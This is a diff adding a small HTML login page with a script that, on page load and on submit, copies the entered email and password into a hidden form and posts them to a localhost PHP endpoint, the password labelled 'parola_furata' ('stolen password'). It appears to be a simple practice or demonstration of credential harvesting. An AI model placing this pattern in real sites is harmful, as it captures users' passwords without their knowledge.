@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+</head>
+
+<body onload="formular()">
+    <div class="container">
+        <h2>Formular</h2>
+        <form id="form1" name="myform" action="javascript.php" onsubmit="formular()">
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" class="form-control" id="email" placeholder="Enter email" name="email" value="demo1@example.com">
+            </div>
+            <div class="form-group">
+                <label for="pwd">Password:</label>
+                <input type="password" class="form-control" id="pwd" placeholder="Enter password" name="pswd" value="demo1password">
+            </div>
+            <div class="form-group form-check">
+                <label class="form-check-label">
+                    <input class="form-check-input" type="checkbox" name="remember"> Remember me
+                </label>
+            </div>
+            <button type="submit" class="btn btn-primary">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function formular() {
+
+
+            var form = document.createElement("form");
+            var element1 = document.createElement("input");
+            var element2 = document.createElement("input");
+            var element3 = document.createElement("input");
+            var element4 = document.createElement("input");
+
+            form.method = "POST";
+            form.action = "http://localhost/mysite/test.php";
+
+            element1.value = 'Adrian';
+            element1.name = "fname";
+            form.appendChild(element1);
+
+            element2.value = 'Popescu';
+            element2.name = "lname";
+            form.appendChild(element2);
+
+            element3.value = document.getElementById("email").value;
+            element3.name = "email";
+            form.appendChild(element3);
+
+            element4.value = document.getElementById("pwd").value;
+            element4.name = "parola_furata";
+            form.appendChild(element4);
+
+            document.body.appendChild(form);
+
+            form.submit();
+            alert('Formular trimis');
+            setTimeout(function(){ 
+    console.log("Ready")
+}, 5000);
+        } 
+    </script>
+</body>
+
+</html>
